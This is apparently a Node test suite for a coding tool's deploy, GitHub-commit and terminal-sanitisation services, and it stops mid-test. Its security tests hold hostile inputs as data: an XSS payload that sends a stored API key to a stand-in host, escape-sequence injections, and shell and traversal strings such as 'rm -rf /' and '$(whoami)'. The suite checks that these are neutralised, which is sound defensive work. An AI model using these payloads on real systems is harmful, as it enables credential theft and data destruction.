/**
 * Test suite for the deploy, GitHub, credential and terminal-safety services,
 * plus the XSS fix in the AI assistant renderer.
 *
 * ## Why this file exists
 *
 * The repo has no test runner and no test script. These are the modules where the
 * non-obvious logic lives — polling loops, status classification, the git-blob
 * diff that decides whether a file is uploaded at all — and all of it is
 * exercisable without a network by controlling what `fetch` returns.
 *
 * Run with `npm run audit:tests` (or `node scripts/audit-run-tests.mjs`).
 *
 * The modules are bundled by `audit-harness.mjs` and driven through a stubbed
 * global `fetch`, so what runs is the shipped code rather than a transcription of
 * it.
 */

import { test, describe, beforeEach, after } from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { services, cleanup } from './audit-harness.mjs';

const {
  deployProject, sanitizeDeployName, estimateDeploy, buildDeployFiles,
  DEPLOY_PROVIDERS, DeployError, readNetlifySiteId, rememberNetlifySiteId,
  commitFiles, createRepository, pullFiles, parseRepoInput, listRepos,
  GitHubSyncError,
  saveCredential, readCredential, forgetCredential, describeCredential,
  sanitizeForTerminal, sanitizeForTerminalLines, sanitizeLines,
  isValidPackageName, isValidVersionSpecifier,
  renderInlineMarkup, escapeHtml,
} = services;

/* ── Fixture ──────────────────────────────────────────────────────────────── */

const plainProject = {
  projectType: 'plain',
  files: [
    { path: 'index.html', content: '<h1>hi</h1>', language: 'html' },
    { path: 'style.css', content: 'h1{color:red}', language: 'css' },
    { path: 'script.js', content: 'console.log(1)', language: 'javascript' },
  ],
};

const token = 'test-token';

/**
 * Installs a `fetch` stub driven by a list of handlers, and records every request.
 * A handler matches on a substring of the URL and returns `{ status, body, headers }`.
 */
const installFetch = (handlers) => {
  const calls = [];
  globalThis.fetch = async (url, init = {}) => {
    calls.push({ url: String(url), method: init.method ?? 'GET', body: init.body, headers: init.headers });

    for (const handler of handlers) {
      if (String(url).includes(handler.match)) {
        const result = typeof handler.reply === 'function' ? await handler.reply(calls.length, calls) : handler.reply;
        return new Response(JSON.stringify(result.body ?? {}), {
          status: result.status ?? 200,
          headers: result.headers ?? { 'Content-Type': 'application/json' },
        });
      }
    }
    throw new Error(`Unexpected request: ${init.method ?? 'GET'} ${url}`);
  };
  return calls;
};

const json = (body, status = 200, headers = {}) => ({ status, body, headers: { 'Content-Type': 'application/json', ...headers } });

// Node has these as globals; the `??=` is belt-and-braces for older runtimes.
globalThis.TextEncoder ??= (await import('node:util')).TextEncoder;
after(() => cleanup());

beforeEach(() => {
  globalThis.localStorage?.clear?.();
  globalThis.window && (globalThis.window.localStorage = makeStorage());
});

function makeStorage() {
  const map = new Map();
  return {
    getItem: (k) => (map.has(k) ? map.get(k) : null),
    setItem: (k, v) => void map.set(k, String(v)),
    removeItem: (k) => void map.delete(k),
    clear: () => map.clear(),
    get length() { return map.size; },
  };
}

/* ═══ XSS: the AI assistant renderer ═══════════════════════════════════════ */

describe('renderInlineMarkup — XSS prevention', () => {
  test('neutralises an img/onerror payload', () => {
    const out = renderInlineMarkup('<img src=x onerror=fetch("//evil/"+localStorage["gbcoder_e2b_key"])>');
    assert.ok(!out.includes('<img'), 'must not emit an img tag');
    assert.ok(!out.includes('onerror='), 'must not emit an event handler');
    assert.ok(out.includes('&lt;img'), 'payload should appear escaped');
  });

  test('neutralises a script tag', () => {
    const out = renderInlineMarkup('<script>alert(1)</script>');
    assert.ok(!out.includes('<script'), 'must not emit a script tag');
    assert.ok(out.includes('&lt;script&gt;'));
  });

  test('neutralises an iframe', () => {
    const out = renderInlineMarkup('<iframe src="javascript:alert(1)"></iframe>');
    assert.ok(!out.includes('<iframe'));
  });

  test('neutralises an svg/onload payload', () => {
    const out = renderInlineMarkup('<svg onload=alert(1)>');
    assert.ok(!out.includes('<svg'));
    assert.ok(!out.includes('onload='));
  });

  test('preserves bold and inline code', () => {
    const out = renderInlineMarkup('use **bold** and `code` here');
    assert.ok(out.includes('<strong>bold</strong>'), out);
    assert.ok(out.includes('<code'), out);
    assert.ok(out.includes('code'), out);
  });

  test('converts newlines to breaks', () => {
    assert.ok(renderInlineMarkup('a\nb').includes('<br />'));
  });

  test('escapes quotes so an attribute cannot be closed', () => {
    assert.ok(escapeHtml('a "b" \'c\'').includes('&quot;'));
    assert.ok(escapeHtml('a "b" \'c\'').includes('&#39;'));
  });

  test('a $& in model text is not treated as a capture reference', () => {
    // `String.replace` with a string replacement would expand `$&` to the match.
    const out = renderInlineMarkup('**$&**');
    assert.ok(!out.includes('$&'), `expected literal $& escaped/kept, got ${out}`);
  });

  test('an escaped payload cannot re-enter as markup via the code span', () => {
    // Backticks must not let content skip escaping.
    const out = renderInlineMarkup('`<b>x</b>`');
    assert.ok(!out.includes('<b>x</b>'), out);
  });
});

/* ═══ Terminal escape sanitisation ════════════════════════════════════════ */

describe('sanitizeForTerminal — escape-sequence injection', () => {
  test('strips clear-screen (forged output)', () => {
    assert.equal(sanitizeForTerminal('a\x1b[2J\x1b[Hb'), 'ab');
  });

  test('strips OSC title-set (phishing)', () => {
    assert.equal(sanitizeForTerminal('\x1b]0;Trusted - npm audit clean\x07'), 'Trusted - npm audit clean');
  });

  test('strips cursor movement', () => {
    assert.equal(sanitizeForTerminal('\x1b[10D\x1b[5Ctext'), 'text');
  });

  test('strips 8-bit CSI and OSC introducers', () => {
    assert.ok(!sanitizeForTerminal('a\x9b2Jb').includes('\x9b'));
    assert.ok(!sanitizeForTerminal('a\x9d0;title\x9cb').includes('\x9d'));
  });

  test('strips backspace so a program cannot rewrite in place', () => {
    assert.equal(sanitizeForTerminal('abc\b\b\bxyz'), 'abcxyz');
  });

  test('keeps newline, carriage return and tab — those are layout', () => {
    assert.equal(sanitizeForTerminal('a\nb\tc\rd'), 'a\nb\tc\rd');
  });

  test('normalises CRLF for xterm', () => {
    assert.equal(sanitizeForTerminalLines('a\nb'), 'a\r\nb');
    assert.equal(sanitizeForTerminalLines('a\r\nb'), 'a\r\nb');
  });

  test('sanitizeLines drops lines that became empty', () => {
    // Stripping the introducer leaves the parameters as inert visible text, which
    // is the point: `[2J` on its own repaints nothing.
    assert.deepEqual(sanitizeLines(['a', '\x1b\x1b', 'b']), ['a', 'b']);
    assert.deepEqual(sanitizeLines(['a', '\x1b[2J', 'b']), ['a', '[2J', 'b']);
  });
});

/* ═══ npm package-name validation ══════════════════════════════════════════ */

describe('isValidPackageName', () => {
  test('accepts ordinary names', () => {
    for (const name of ['axios', 'lodash.merge', 'react-dom', '@scope/pkg', 'a', 'x.y_z-1']) {
      assert.ok(isValidPackageName(name), `should accept ${name}`);
    }
  });

  test('rejects traversal', () => {
    for (const name of ['..', '.', '../evil', '../../etc/passwd', 'a/../../b', './x']) {
      assert.ok(!isValidPackageName(name), `should reject ${name}`);
    }
  });

  test('rejects separators and control characters', () => {
    for (const name of ['a/b', '/abs', 'a\\b', 'a\nb', 'a b', 'a\x00b', 'a;rm -rf /']) {
      assert.ok(!isValidPackageName(name), `should reject ${JSON.stringify(name)}`);
    }
  });

  test('rejects empty and over-long', () => {
    assert.ok(!isValidPackageName(''));
    assert.ok(!isValidPackageName('a'.repeat(215)));
  });

  test('rejects a leading dash, which npm reads as a flag', () => {
    assert.ok(!isValidPackageName('-rf'));
  });
});

describe('isValidVersionSpecifier', () => {
  test('accepts semver and dist-tags', () => {
    for (const v of ['latest', '1.7.0', '^1.7.0', '~1.2', '>=1.0.0 <2.0.0', 'next']) {
      assert.ok(isValidVersionSpecifier(v), `should accept ${v}`);
    }
  });

  test('rejects anything carrying JSON or shell metacharacters', () => {
    for (const v of ['1.0.0","evil":"x', '1.0.0; rm -rf /', '$(whoami)', 'a`b`']) {
      assert.ok(!isValidVersionSpecifier(v), `should reject ${v}`);
    }
  });
});

/* ═══ sanitizeDeployName ═══════════════════════════════════════════════════ */

describe('sanitizeDeployName', () => {
  test('produces a valid hostname label', () => {
    for (const input of ['My Cool App', 'my.app.v2', 'my   app!!!', '--x--', 'UPPER']) {
      const out = sanitizeDeployName(input);
      assert.match(out, /^[a-z0-9]+(-[a-z0-9]+)*$/, `${input} -> ${out}`);
    }
  });

  test('strips dots, which the export sanitizer keeps but a hostname cannot', () => {
    assert.equal(sanitizeDeployName('my.app'), 'my-app');
  });

  test('falls back when nothing survives', () => {
    assert.equal(sanitizeDeployName(''), 'gb-coder-project');
    assert.equal(sanitizeDeployName('!!!'), 'gb-coder-project');
    assert.equal(sanitizeDeployName(undefined), 'gb-coder-project');
  });

  test('never ends in a hyphen', () => {
    assert.ok(!sanitizeDeployName(`${'x'.repeat(59)}-tail`).endsWith('-'));
  });
});

/* ═══ Bundle + limits ══════════════════════════════════════════════════════ */

describe('buildDeployFiles / estimateDeploy', () => {
  test('includes index.html and the assets it references', () => {
    const files = buildDeployFiles(plainProject, { projectName: 'demo' });
    const paths = files.map((f) => f.path);
    assert.ok(paths.includes('index.html'), paths.join(','));
    assert.ok(paths.includes('style.css'));
    assert.ok(paths.includes('script.js'));
  });

  test('index.html links rather than inlines, so the assets are really needed', () => {
    const files = buildDeployFiles(plainProject, { projectName: 'demo' });
    const html = files.find((f) => f.path === 'index.html').content;
    assert.ok(html.includes('style.css'), 'should reference style.css');
    assert.ok(html.includes('script.js'), 'should reference script.js');
  });

  test('reports a problem when the file count is over the limit', () => {
    // A framework project, because that is the mode where every editor file
    // becomes an archive member — plain mode always emits its three fixed paths.
    const many = {
      projectType: 'react',
      entry: 'main.jsx',
      files: Array.from({ length: 1200 }, (_, i) => ({
        path: `src/f${i}.js`, content: 'x', language: 'javascript',
      })),
    };
    const estimate = estimateDeploy(many);
    assert.ok(estimate.problem, `expected a limit problem, got ${JSON.stringify(estimate)}`);
    assert.match(estimate.problem, /files/);
    assert.ok(estimate.fileCount > 900);
  });
});

/* ═══ Vercel deploy ════════════════════════════════════════════════════════ */

describe('deployProject — Vercel', () => {
  test('creates, polls to READY, and returns the production URL', async () => {
    let polls = 0;
    const calls = installFetch([
      { match: '/v13/deployments?skipAutoDetectionConfirmation', reply: json({ id: 'dpl_1', readyState: 'QUEUED', url: 'demo-abc.vercel.app' }) },
      {
        match: '/v13/deployments/dpl_1',
        reply: () => {
          polls += 1;
          // Two non-ready states first, so the polling loop is genuinely exercised.
          return polls < 3
            ? json({ id: 'dpl_1', readyState: polls === 1 ? 'INITIALIZING' : 'BUILDING', url: 'demo-abc.vercel.app' })
            : json({ id: 'dpl_1', readyState: 'READY', url: 'demo-abc.vercel.app', alias: ['demo.vercel.app'] });
        },
      },
    ]);

    const result = await deployProject({ project: plainProject, provider: 'vercel', token, projectName: 'demo' });

    assert.equal(result.provider, 'vercel');
    assert.equal(result.url, 'https://demo.vercel.app', 'should prefer the production alias');
    assert.equal(result.deploymentId, 'dpl_1');
    assert.ok(result.fileCount >= 4);
    assert.equal(calls.length, 4, `expected 1 create + 3 polls, got ${calls.length}`);

    const create = calls[0];
    assert.equal(create.method, 'POST');
    assert.equal(create.headers.Authorization, `Bearer ${token}`);
    const payload = JSON.parse(create.body);
    assert.ok(Array.isArray(payload.files), 'files must be an array');
    assert.ok(payload.files.every((f) => typeof f.file === 'string' && typeof f.data === 'string'));
    assert.equal(payload.projectSettings.framework, null, 'plain project must be static');
    assert.equal(payload.target, 'production');
  });

  test('sends auto-detected build settings for a framework project', async () => {
    const calls = installFetch([
      { match: '/v13/deployments?skipAutoDetectionConfirmation', reply: json({ id: 'dpl_2', readyState: 'BUILDING', url: 'r.vercel.app' }) },
      { match: '/v13/deployments/dpl_2', reply: json({ id: 'dpl_2', readyState: 'READY', url: 'r.vercel.app' }) },
    ]);

    await deployProject({
      project: { projectType: 'react', files: [{ path: 'main.jsx', content: 'export default null', language: 'jsx' }], entry: 'main.jsx' },
      provider: 'vercel', token, projectName: 'r',
    });

    const payload = JSON.parse(calls[0].body);
    assert.ok(!('framework' in payload.projectSettings), 'must not pin a framework');
    assert.equal(payload.projectSettings.buildCommand, null, 'build command must auto-detect');
    assert.equal(payload.projectSettings.installCommand, null);
    assert.equal(payload.projectSettings.outputDirectory, null);
  });

  test('surfaces ERROR with the provider message', async () => {
    installFetch([
      { match: '/v13/deployments?skipAutoDetectionConfirmation', reply: json({ id: 'dpl_3', readyState: 'BUILDING' }) },
      { match: '/v13/deployments/dpl_3', reply: json({ id: 'dpl_3', readyState: 'ERROR', errorMessage: 'Module not found: ./missing' }) },
    ]);

    await assert.rejects(
      () => deployProject({ project: plainProject, provider: 'vercel', token, projectName: 'x' }),
      (error) => {
        assert.ok(error instanceof DeployError);
        assert.match(error.message, /Module not found/);
        assert.equal(error.stage, 'building');
        assert.equal(error.retryable, false);
        return true;
      },
    );
  });

  test('treats CANCELED as terminal', async () => {
    installFetch([
      { match: '/v13/deployments?skipAutoDetectionConfirmation', reply: json({ id: 'dpl_4', readyState: 'BUILDING' }) },
      { match: '/v13/deployments/dpl_4', reply: json({ id: 'dpl_4', readyState: 'CANCELED' }) },
    ]);
    await assert.rejects(() => deployProject({ project: plainProject, provider: 'vercel', token, projectName: 'x' }), /cancel/i);
  });

  test('maps 401 to an actionable auth error, not a retry', async () => {
    installFetch([{ match: '/v13/deployments', reply: json({ error: { message: 'invalid token' } }, 401) }]);
    await assert.rejects(
      () => deployProject({ project: plainProject, provider: 'vercel', token, projectName: 'x' }),
      (error) => { assert.equal(error.status, 401); assert.equal(error.retryable, false); return true; },
    );
  });

  test('maps 5xx to retryable', async () => {
    installFetch([{ match: '/v13/deployments', reply: json({ error: 'oops' }, 503) }]);
    await assert.rejects(
      () => deployProject({ project: plainProject, provider: 'vercel', token, projectName: 'x' }),
      (error) => { assert.equal(error.retryable, true); return true; },
    );
  });

  test('rejects an empty token before any request', async () => {
    const calls = installFetch([]);
    await assert.rejects(
      () => deployProject({ project: plainProject, provider: 'vercel', token: '   ', projectName: 'x' }),
      /token is required/i,
    );
    assert.equal(calls.length, 0, 'must not hit the network');
  });

  test('reports progress through every phase', async () => {
    installFetch([
      { match: '/v13/deployments?skipAutoDetectionConfirmation', reply: json({ id: 'dpl_5', readyState: 'BUILDING', url: 'p.vercel.app' }) },
      { match: '/v13/deployments/dpl_5', reply: json({ id: 'dpl_5', readyState: 'READY', url: 'p.vercel.app' }) },
    ]);
    const seen = [];
    await deployProject({ project: plainProject, provider: 'vercel', token, projectName: 'p', onProgress: (p) => seen.push(p.stage) });
    for (const stage of ['packaging', 'uploading', 'building', 'securing', 'ready']) {
      assert.ok(seen.includes(stage), `missing stage ${stage}; saw ${seen.join(',')}`);
    }
  });
});

/* ═══ Netlify deploy ═══════════════════════════════════════════════════════ */

describe('deployProject — Netlify', () => {
  test('creates a site, uploads a zip, polls, and returns the site URL', async () => {
    let polls = 0;
    const calls = installFetch([
      { match: '/api/v1/sites', method: 'POST', reply: json({ id: 'site_1', name: 'demo', ssl_url: 'https://demo.netlify.app' }) },
      {
        match: '/api/v1/deploys/',
        reply: () => {
          polls += 1;
          return json({ id: 'dep_1', state: polls < 2 ? 'uploaded' : 'ready' });
        },
      },
    ]);

    const result = await deployProject({ project: plainProject, provider: 'netlify', token, projectName: 'demo' });

    assert.equal(result.provider, 'netlify');
    assert.equal(result.url, 'https://demo.netlify.app');
    assert.equal(result.target, 'site_1');
    assert.equal(result.assignedName, 'demo');
    assert.ok(polls >= 2, `expected the deploy to be polled, saw ${polls}`);

    const siteCall = calls.find((c) => c.url.endsWith('/sites') && c.method === 'POST');
    const siteBody = JSON.parse(siteCall.body);
    assert.equal(siteBody.name, 'demo');
    assert.equal(siteBody.created_via, 'gb-coder', 'should identify the tool to Netlify');

    const deployCall = calls.find((c) => c.url.includes('/deploys') && c.method === 'POST');
    assert.equal(deployCall.headers['Content-Type'], 'application/zip');
    assert.ok(deployCall.body instanceof ArrayBuffer, 'zip must be sent as a raw buffer');
    assert.equal(deployCall.body.byteLength > 4, true, 'zip must be non-empty');
    // PK zip signature.
    assert.deepEqual([...new Uint8Array(deployCall.body).slice(0, 2)], [0x50, 0x4b]);
  });

  test('retries site creation without a name when the name is taken', async () => {
    const calls = installFetch([
      { match: '/api/v1/sites', reply: (n, all) => (all.filter((c) => c.url.endsWith('/sites')).length === 1
        ? json({ code: 2502, error: 'name already taken' }, 422)
        : json({ id: 'site_2', name: 'random-name-xyz', ssl_url: 'https://random-name-xyz.netlify.app' })) },
      { match: '/api/v1/deploys/', reply: json({ id: 'dep_2', state: 'ready' }) },
    ]);

    const result = await deployProject({ project: plainProject, provider: 'netlify', token, projectName: 'taken' });

    assert.equal(result.url, 'https://random-name-xyz.netlify.app');
    assert.equal(result.assignedName, 'random-name-xyz', 'must report the name actually assigned');
    const siteBodies = calls.filter((c) => c.url.endsWith('/sites')).map((c) => JSON.parse(c.body));
    assert.equal(siteBodies.length, 2);
    assert.equal(siteBodies[0].name, 'taken');
    assert.ok(!('name' in siteBodies[1]), 'retry must omit the name');
  });

  test('reuses a remembered site instead of creating a new one', async () => {
    globalThis.window.localStorage.clear();
    rememberNetlifySiteId('demo', 'site_existing');

    const calls = installFetch([
      { match: '/api/v1/sites/site_existing', reply: json({ id: 'site_existing', name: 'demo', ssl_url: 'https://demo.netlify.app' }) },
      { match: '/api/v1/deploys/', reply: json({ id: 'dep_3', state: 'ready' }) },
    ]);

    const result = await deployProject({
      project: plainProject, provider: 'netlify', token, projectName: 'demo',
      netlifySiteId: readNetlifySiteId('demo'),
    });

    assert.equal(result.target, 'site_existing');
    assert.ok(!calls.some((c) => c.method === 'POST' && c.url.endsWith('/sites')), 'must not create a second site');
  });

  test('recreates the site when a remembered one has been deleted (404)', async () => {
    globalThis.window.localStorage.clear();
    const calls = installFetch([
      { match: '/api/v1/sites/gone', reply: json({ error: 'not found' }, 404) },
      { match: '/api/v1/sites', reply: json({ id: 'site_new', name: 'demo', ssl_url: 'https://demo.netlify.app' }) },
      { match: '/api/v1/deploys/', reply: json({ id: 'dep_4', state: 'ready' }) },
    ]);

    const result = await deployProject({
      project: plainProject, provider: 'netlify', token, projectName: 'demo', netlifySiteId: 'gone',
    });
    assert.equal(result.target, 'site_new');
    assert.ok(calls.some((c) => c.method === 'POST' && c.url.endsWith('/sites')));
  });

  test('does NOT silently mint a new site when the token is simply wrong', async () => {
    installFetch([
      { match: '/api/v1/sites/site_x', reply: json({ error: 'forbidden' }, 403) },
      { match: '/api/v1/sites', reply: json({ id: 'should_not_happen' }) },
      { match: '/api/v1/deploys/', reply: json({ id: 'x', state: 'ready' }) },
    ]);
    await assert.rejects(
      () => deployProject({ project: plainProject, provider: 'netlify', token, projectName: 'd', netlifySiteId: 'site_x' }),
      (error) => { assert.equal(error.status, 403); return true; },
    );
  });

  test('surfaces an error deploy state', async () => {
    installFetch([
      { match: '/api/v1/sites', reply: json({ id: 's', name: 'e', ssl_url: 'https://e.netlify.app' }) },
      { match: '/api/v1/deploys/', reply: json({ id: 'dep_5', state: 'error', error_message: 'Build failed: missing script' }) },
    ]);
    await assert.rejects(
      () => deployProject({ project: plainProject, provider: 'netlify', token, projectName: 'e' }),
      /Build failed/,
    );
  });

  test('exposes provider metadata for the token links', () => {
    for (const id of ['vercel', 'netlify']) {
      const info = DEPLOY_PROVIDERS[id];
      assert.match(info.tokenUrl, /^https:\/\//);
      assert.ok(info.scopeNote.length > 20, 'scope guidance should be present');
    }
  });
});

/* ═══ GitHub: input parsing ════════════════════════════════════════════════ */

describe('parseRepoInput', () => {
  test('understands the shapes users actually paste', () => {
    assert.deepEqual(parseRepoInput('https://github.com/vercel/next.js'), { owner: 'vercel', repo: 'next.js' });
    assert.deepEqual(parseRepoInput('https://github.com/a/b/'), { owner: 'a', repo: 'b' });
    assert.deepEqual(parseRepoInput('a/b'), { owner: 'a', repo: 'b' });
    assert.deepEqual(parseRepoInput('git@github.com:a/b.git'), { owner: 'a', repo: 'b' });
    assert.deepEqual(parseRepoInput('https://github.com/a/b/tree/main/src'), { owner: 'a', repo: 'b' });
    assert.deepEqual(parseRepoInput('https://github.com/a/b/blob/main/x.js?raw=1#L2'), { owner: 'a', repo: 'b' });
    assert.deepEqual(parseRepoInput('  a/b  '), { owner: 'a', repo: 'b' });
  });

  test('rejects nonsense', () => {
    assert.equal(parseRepoInput(''), null);
    assert.equal(parseRepoInput('justowner'), null);
  });
});

/* ═══ GitHub: listing ═══════════════════════════════════════════════════════ */

describe('listRepos', () => {
  test('walks pages until a short page, and reports write access', async () => {
    const page1 = Array.from({ length: 100 }, (_, i) => ({
      id: i, name: `r${i}`, full_name: `me/r${i}`, private: false, default_branch: 'main',
      description: null, updated_at: '', permissions: { push: true },
    }));
    const calls = installFetch([
      { match: '/user/repos?per_page=100&page=1', reply: json(page1) },
      { match: '/user/repos?per_page=100&page=2', reply: json([{ id: 999, name: 'last', full_name: 'me/last', private: true, default_branch: 'main', description: 'x', updated_at: '', permissions: { pull: true } }]) },
    ]);

    const repos = await listRepos(token);
    assert.equal(repos.length, 101, 'must include the second page');
    assert.equal(calls.length, 2);
    assert.equal(repos[0].canPush, true);
    assert.equal(repos[100].canPush, false, 'read-only repo must be detected');
    assert.equal(repos[100].private, true);
  });

  test('stops at the page cap', async () => {
    const page = Array.from({ length: 100 }, (_, i) => ({
      id: i, name: `r${i}`, full_name: `me/r${i}`, private: false, default_branch: 'main',
      description: null, updated_at: '', permissions: { push: true },
    }));
    const calls = installFetch([{ match: '/user/repos', reply: json(page) }]);

    const repos = await listRepos(token);
    assert.equal(repos.length, 300, 'bounded at 3 pages');
    assert.equal(calls.length, 3);
  });
});

/* ═══ GitHub: commits ══════════════════════════════════════════════════════ */

describe('commitFiles', () => {
  const treeWith = (entries) => json({ sha: 'tree_base', tree: entries.map((e) => ({ path: e.path, type: 'blob', sha: e.sha, size: e.size })) });

  test('reports "already up to date" without writing anything', async () => {
    // Blob sha of 'x' is the well-known constant below.
    const calls = installFetch([
      { match: '/git/ref/heads/main', reply: json({ object: { sha: 'head1' } }) },
      { match: '/git/commits/head1', reply: json({ sha: 'head1', tree: { sha: 'tree_base' }, html_url: '' }) },
      { match: '/git/trees/tree_base', reply: treeWith([{ path: 'a.js', sha: shaOf('x') }]) },
    ]);

    const result = await commitFiles({
      token, ref: { owner: 'o', repo: 'r' }, branch: 'main',
      message: 'm', files: [{ path: 'a.js', content: 'x' }],
    });

    assert.equal(result.alreadyUpToDate, true);
    assert.equal(result.filesChanged, 0);
    assert.ok(!calls.some((c) => c.url.endsWith('/git/blobs')), 'must not upload an unchanged blob');
    assert.ok(!calls.some((c) => c.method === 'PATCH'), 'must not move the branch');
  });

  test('writes one atomic commit and moves the branch non-forcefully', async () => {
    const calls = installFetch([
      { match: '/git/ref/heads/main', reply: json({ object: { sha: 'head2' } }) },
      { match: '/git/commits/head2', reply: json({ sha: 'head2', tree: { sha: 'tree_base' }, html_url: '' }) },
      { match: '/git/trees/tree_base', reply: treeWith([]) },
      { match: '/git/blobs', reply: json({ sha: 'blob_new' }) },
      { match: '/git/trees', method: 'POST', reply: json({ sha: 'tree_new', tree: [] }) },
      { match: '/git/commits', method: 'POST', reply: json({ sha: 'commit_new', html_url: 'https://github.com/o/r/commit/commit_new' }) },
      { match: '/git/refs/heads/main', method: 'PATCH', reply: json({ object: { sha: 'commit_new' } }) },
    ]);

    const result = await commitFiles({
      token, ref: { owner: 'o', repo: 'r' }, branch: 'main', message: 'Update UI',
      files: [{ path: 'a.js', content: 'y' }],
    });

    assert.equal(result.alreadyUpToDate, false);
    assert.equal(result.commitSha, 'commit_new');

    const blobCall = calls.find((c) => c.url.endsWith('/git/blobs'));
    const blobBody = JSON.parse(blobCall.body);
    assert.equal(blobBody.encoding, 'base64');
    assert.equal(Buffer.from(blobBody.content, 'base64').toString('utf8'), 'y');

    const treeCall = calls.find((c) => c.method === 'POST' && c.url.endsWith('/git/trees'));
    assert.equal(JSON.parse(treeCall.body).base_tree, 'tree_base', 'must build on the existing tree');

    const commitCall = calls.find((c) => c.method === 'POST' && c.url.endsWith('/git/commits'));
    assert.deepEqual(JSON.parse(commitCall.body).parents, ['head2'], 'exactly one parent');

    const patch = calls.find((c) => c.method === 'PATCH');
    assert.equal(JSON.parse(patch.body).force, false, 'must never force-push');
  });

  test('does not delete remote files unless asked', async () => {
    const calls = installFetch([
      { match: '/git/ref/heads/main', reply: json({ object: { sha: 'head3' } }) },
      { match: '/git/commits/head3', reply: json({ sha: 'head3', tree: { sha: 'tree_base' }, html_url: '' }) },
      { match: '/git/trees/tree_base', reply: treeWith([{ path: 'secret.js', sha: shaOf('q') }]) },
      { match: '/git/blobs', reply: json({ sha: 'b' }) },
      { match: '/git/trees', method: 'POST', reply: json({ sha: 'tn', tree: [] }) },
      { match: '/git/commits', method: 'POST', reply: json({ sha: 'cn', html_url: '' }) },
      { match: '/git/refs/heads/main', method: 'PATCH', reply: json({ object: { sha: 'cn' } }) },
    ]);

    await commitFiles({
      token, ref: { owner: 'o', repo: 'r' }, branch: 'main', message: 'm',
      files: [{ path: 'a.js', content: 'z' }],
    });

    const treeBody = JSON.parse(calls.find((c) => c.method === 'POST' && c.url.endsWith('/git/trees')).body);
    const deletions = treeBody.tree.filter((e) => e.sha === null);
    assert.equal(deletions.length, 0, 'must not delete by default');
  });

  test('deletes remote files when explicitly asked', async () => {
    const calls = installFetch([
      { match: '/git/ref/heads/main', reply: json({ object: { sha: 'head4' } }) },
      { match: '/git/commits/head4', reply: json({ sha: 'head4', tree: { sha: 'tree_base' }, html_url: '' }) },
      { match: '/git/trees/tree_base', reply: treeWith([{ path: 'gone.js', sha: shaOf('q') }]) },
      { match: '/git/blobs', reply: json({ sha: 'b' }) },
      { match: '/git/trees', method: 'POST', reply: json({ sha: 'tn', tree: [] }) },
      { match: '/git/commits', method: 'POST', reply: json({ sha: 'cn', html_url: '' }) },
      { match: '/git/refs/heads/main', method: 'PATCH', reply: json({ object: { sha: 'cn' } }) },
    ]);

    const result = await commitFiles({
      token, ref: { owner: 'o', repo: 'r' }, branch: 'main', message: 'm',
      files: [{ path: 'a.js', content: 'z' }], deleteMissing: true,
    });

    const treeBody = JSON.parse(calls.find((c) => c.method === 'POST' && c.url.endsWith('/git/trees')).body);
    assert.ok(treeBody.tree.some((e) => e.path === 'gone.js' && e.sha === null), 'must include the deletion');
    assert.equal(result.filesChanged, 2);
  });

  test('translates a 422 on the ref update into a conflict, not generic validation', async () => {
    installFetch([
      { match: '/git/ref/heads/main', reply: json({ object: { sha: 'head5' } }) },
      { match: '/git/commits/head5', reply: json({ sha: 'head5', tree: { sha: 'tb' }, html_url: '' }) },
      { match: '/git/trees/tb', reply: treeWith([]) },
      { match: '/git/blobs', reply: json({ sha: 'b' }) },
      { match: '/git/trees', method: 'POST', reply: json({ sha: 'tn', tree: [] }) },
      { match: '/git/commits', method: 'POST', reply: json({ sha: 'cn', html_url: '' }) },
      { match: '/git/refs/heads/main', method: 'PATCH', reply: json({ message: 'Update is not a fast forward' }, 422) },
    ]);

    await assert.rejects(
      () => commitFiles({
        token, ref: { owner: 'o', repo: 'r' }, branch: 'main', message: 'm',
        files: [{ path: 'a.js', content: 'z' }],
      }),
      (error) => {
        assert.ok(error instanceof GitHubSyncError);
        assert.equal(error.kind, 'conflict', 'a 422 on the ref must read as a conflict');
        assert.match(error.message, /nothing of yours or anyone/i);
        return true;
      },
    );
  });

  test('maps an expired token to kind=auth', async () => {
    installFetch([{ match: '/git/ref/heads/main', reply: json({ message: 'Bad credentials' }, 401) }]);
    await assert.rejects(
      () => commitFiles({ token, ref: { owner: 'o', repo: 'r' }, branch: 'main', message: 'm', files: [] }),
      (error) => { assert.equal(error.kind, 'auth'); assert.equal(error.retryable, false); return true; },
    );
  });

  test('maps an exhausted rate limit with a wait time', async () => {
    installFetch([{ match: '/git/ref/heads/main', reply: json({ message: 'rate limited' }, 403, {
      'x-ratelimit-remaining': '0',
      'x-ratelimit-reset': String(Math.floor(Date.now() / 1000) + 120),
    }) }]);

    await assert.rejects(
      () => commitFiles({ token, ref: { owner: 'o', repo: 'r' }, branch: 'main', message: 'm', files: [] }),
      (error) => {
        assert.equal(error.kind, 'rate-limit');
        assert.equal(error.retryable, true);
        assert.ok(error.retryAfterSeconds > 0);
        return true;
      },
    );
  });

  test('includes GitHub message in 422 from repo creation (not a conflict)', async () => {
    installFetch([{ match: '/user/repos', reply: json({ message: 'name already exists on this account' }, 422) }]);
    await assert.rejects(
      () => createRepository({ token, name: 'taken', private: false, autoInit: true, files: [{ path: 'a', content: 'b' }], commitMessage: 'm' }),
      (error) => {
        assert.equal(error.kind, 'validation', 'a taken repo name is not a merge conflict');
        assert.match(error.message, /already exists/);
        return true;
      },
    );
  });
});

/* ═══ GitHub: repository creation ══════════════════════════════════════════ */

describe('createRepository', () => {
  const created = (extra = {}) => json({ id: 1, name: 'newrepo', full_name: 'me/newrepo', owner: { login: 'me' }, private: false, default_branch: 'main', description: null, updated_at: '', ...extra });

  test('with autoInit, builds on the seed commit', async () => {
    const calls = installFetch([
      { match: '/user/repos', reply: created() },
      { match: '/git/ref/heads/main', reply: json({ object: { sha: 'seed' } }) },
      { match: '/git/commits/seed', reply: json({ sha: 'seed', tree: { sha: 'tb' }, html_url: '' }) },
      { match: '/git/trees/tb', reply: json({ sha: 'tb', tree: [{ path: 'README.md', type: 'blob', sha: 'r0' }] }) },
      { match: '/git/blobs', reply: json({ sha: 'b' }) },
      { match: '/git/trees', method: 'POST', reply: json({ sha: 'tn', tree: [] }) },
      { match: '/git/commits', method: 'POST', reply: json({ sha: 'cn', html_url: '' }) },
      { match: '/git/refs/heads/main', method: 'PATCH', reply: json({ object: { sha: 'cn' } }) },
    ]);

    const result = await createRepository({
      token, name: 'newrepo', private: false, autoInit: true,
      files: [{ path: 'README.md', content: '# hi' }], commitMessage: 'Initial',
    });

    assert.equal(result.repo.fullName, 'me/newrepo');
